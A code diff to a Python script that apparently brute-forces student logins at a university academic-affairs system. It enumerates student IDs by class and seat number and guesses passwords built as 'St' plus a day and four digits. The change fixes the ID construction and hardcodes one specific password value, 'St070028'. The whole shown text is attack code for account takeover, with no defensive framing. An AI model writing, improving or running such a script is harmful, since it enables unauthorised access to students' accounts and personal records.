@@ -11,10 +11,11 @@ class JiaoWuChu:
 
     def id(self, x):
         for a in [101, 102, 103, 104, 105, 106, 201, 202, 203, 204, 205, 206, 301, 302, 303, 304, 305, 306, 401, 402, 403]:
-            self.nuaaid = x + str(a)
             for b in range(1, 30):
-                self.nuaaid = self.nuaaid + str(b).zfill(2)
+                self.nuaaid = x + str(a) + str(b).zfill(2)
                 jiaowuchu.psd()
+                self.yesno = 0
+                #print('%s-----success' % self.nuaaid)
 
     def psd(self):
         for day in range(1, 32):
@@ -25,6 +26,7 @@ class JiaoWuChu:
                 for x in range(1, 10000):
                     x = str(x)
                     self.passwd = 'St' + day.zfill(2) + x.zfill(4)
+                    self.passwd = 'St070028'
                     self.yesno = jiaowuchu.get()
                     if self.yesno == 1:
                         break
